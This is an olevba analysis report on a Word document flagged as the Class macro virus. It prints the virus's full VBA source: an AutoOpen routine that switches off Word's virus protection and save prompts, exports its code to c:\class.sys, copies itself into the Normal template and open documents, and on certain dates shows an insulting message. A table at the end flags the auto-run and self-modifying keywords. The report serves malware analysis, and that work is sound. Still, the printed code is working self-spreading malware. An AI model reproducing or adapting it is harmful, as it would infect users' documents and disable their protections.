olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-9de64f65283264614b7f85b9df064558dd84ac43
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-9de64f65283264614b7f85b9df064558dd84ac43 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
On Error GoTo out
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
Options.VirusProtection = False
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
Options.SaveNormalPrompt = False
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
Options.ConfirmConversions = False
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
If nt > 70 And ad > 0 Then GoTo out
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
If nt < 70 Then
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
End If
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
host.codemodule.AddFromFile ("c:\class.sys")
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
With host.codemodule
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    For x = 1 To 4
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    .deletelines 1
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    Next x
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
End With
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
If nt < 70 Then
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    With host.codemodule
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    .replaceline 1, "Sub AutoClose()"
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    .replaceline 71, "Sub ToolsMacro()"
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    End With
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
End If
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
With host.codemodule
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    For x = 2 To 72 Step 2
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
    Next x
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
End With
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
out:
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
End Sub
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
Sub ViewVBCode()
'Eddie Ingram5/17/00 12:56:11 AMHP DeskJet 720C Series v10.3 on LPT1:14 jul 98
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

